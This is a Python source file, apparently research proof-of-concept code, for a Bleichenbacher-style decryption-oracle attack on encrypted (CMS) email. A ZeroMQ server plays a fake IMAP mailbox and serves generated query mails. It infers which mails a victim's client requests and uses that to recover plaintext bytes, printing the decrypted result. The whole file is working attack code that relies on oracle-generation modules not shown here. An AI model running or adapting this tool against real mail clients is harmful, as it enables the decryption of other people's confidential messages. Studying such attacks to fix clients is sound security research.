#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2023 Fabian Ising
#
# Distributed under terms of the MIT license.
import argparse
import re
import time
from base64 import b64decode
import traceback

# pylint: disable=import-error
import zmq

from empty_line_oracle import EmptyLineBinarySearchGenerator
from mail_generator import BlockDecryptedException

mails = {}


def parse_args():
    """
    Parse command line arguments.
    """
    parser = argparse.ArgumentParser("Create Bleichenbacher E-Mail.")
    parser.add_argument("file", metavar='eml_file',
                        type=str, help="Path to the eml file.")
    parser.add_argument("--key-file", metavar='key_file',
                        type=str, help="Path to the pem file.", default=None)
    return parser.parse_args()


def main():
    start_uid = 90000
    # number_mails = 2
    args = parse_args()
    with open(args.file, "rb") as cms_file:
        org = b64decode(cms_file.read())
    generator = EmptyLineBinarySearchGenerator(org, args.key_file)
    generator.setup(1)
    context = zmq.Context()
    socket = context.socket(zmq.REP)
    socket.bind("ipc:///tmp/oracle.ipc")
    get_part = re.compile(r"get_part (\d+) (\d+(\.\d+)?)")
    get_part_headers = re.compile(r"get_part_headers (\d+) (\d+(\.\d+)?)")
    first_message = None
    _created_mails = generator.create_first_batch(start_uid)
    unrequested = set()
    last_message = time.time()
    try:
        while True:
            msg = socket.recv().decode()
            if first_message is None:
                first_message = time.time()
            last_message = time.time()
            if msg.startswith("get_part_headers"):
                groups = get_part_headers.match(msg).groups()
                num = int(groups[0])
                part = groups[1]
                if num not in mails:
                    mails[num] = generator.create_mail(num)
                socket.send(mails[num].get_part_headers(
                    num, part).encode("ascii"))
            elif msg.startswith("get_part"):
                groups = get_part.match(msg).groups()
                num = int(groups[0])
                # unrequested.discard(num)
                unrequested = generator.current_mails.intersection(
                    generator.unrequested)
                #print(f"{len(unrequested)} unrequested mails remaining.")
                if len(unrequested) == 0:
                    if generator.finished_time is None and generator.round == 15:
                        generator.finished_time = time.time()
                        print("All messages requested!")
                part = groups[1]
                if num not in mails:
                    mails[num] = generator.create_mail(num)
                socket.send(mails[num].get_part(num, part).encode("ascii"))
            elif msg.startswith("bodystructure"):
                num = int(msg.split(" ")[1])
                if num not in mails:
                    mails[num] = generator.create_mail(num)
                socket.send(generator.generate_bodystructure(
                    num).encode("ascii"))
            elif msg.startswith("headers"):
                num = int(msg.split(" ")[1])
                if num not in mails:
                    mails[num] = generator.create_mail(num)
                socket.send(str(generator.get_headers(num)).encode("ascii"))
            elif msg.startswith("body"):
                num = int(msg.split(" ")[1])
                if num not in mails:
                    mails[num] = generator.create_mail(num)
                socket.send(generator.get_body(num).encode("ascii"))
            elif msg.startswith("size"):
                num = int(msg.split(" ")[1])
                if num not in mails:
                    mails[num] = generator.create_mail(num)
                socket.send(str(generator.get_size(num)).encode("ascii"))
            elif msg.startswith("idle"):
                unrequested = generator.current_mails
                if len(unrequested) > 0:
                    socket.send(
                        f"* {len(unrequested)} EXISTS\r\n* {len(unrequested)} RECENT\r\n".encode("ascii"))
                else:
                    socket.send(
                        "* 1 EXISTS\r\n* 1 RECENT\r\n".encode("ascii"))
                #socket.send(f"* {generator.get_next_unseen()} EXISTS\r\n".encode("ascii"))
            elif msg.startswith("search"):
                unrequested = generator.unrequested
                if len(unrequested) == 0 and len(generator.correct_guesses) == 0 and (time.time()-generator.last_request) > 2:
                    print("Soemthing went wrong, recreate mails!")
                    generator.generate_next_guesses()
                socket.send(
                    f"* SEARCH {' '.join([str(i) for i in list(generator.current_mails)[:]])}\r\n".encode("ascii"))
                #socket.send(f"* SEARCH {' '.join([str(i) for i in range(generator.get_next_unseen(), generator.get_next_unseen()+20)])}\r\n".encode("ascii"))
            elif msg == 'close':
                print("Closing ...")
                break
            if generator.finished:
                print(f"Found solution: {bytes(generator.finished)}")
                break
    except BlockDecryptedException as e:
        print(f"Found solution: {e}")
        return
    except KeyboardInterrupt:
        print("Ending due to user request")
        return
    except (Exception) as e:
        print(e)
        print(traceback.format_exc())
    finally:
        socket.close()
        context.term()
        # Print results
        requested_mails = generator.guess_count
        print(f"Generated {requested_mails} query mails")
        if first_message is not None:
            print(f"In {last_message-first_message} seconds")
            if generator.finished_time is not None:
                print(
                    f"All messages requested after {generator.finished_time-first_message} seconds")
            if generator.all_done is not None:
                print(
                    f"Found full solution after {generator.all_done-first_message} seconds")
        if len(generator.correct_guesses) == 1:
            guess_num = generator.correct_guesses.pop()
            actual_guess = generator.guess_bytes[guess_num]
            if len(actual_guess) == 1:
                print(60*"=")
                print(
                    f"RESULT: {bytes(actual_guess[0]).decode('utf-8', 'replace')}")
                print(60*"=")
        elif len(generator.correct_guesses) > 1:
            print("Full solution not found. Candidates at current step:")
            for uid in generator.correct_guesses:
                actual_guess = generator.guess_bytes[uid]
                print(actual_guess)
        else:
            print("Full solution not found.")
        for uid in generator.correct_guesses:
            print(generator.get_part(uid, 0))
            guess_num = list(generator.correct_guesses)[0]
            print(
                f"Solution: {' '.join(chr(b) for b in generator.guess_bytes[guess_num])}")


if __name__ == "__main__":
    main()
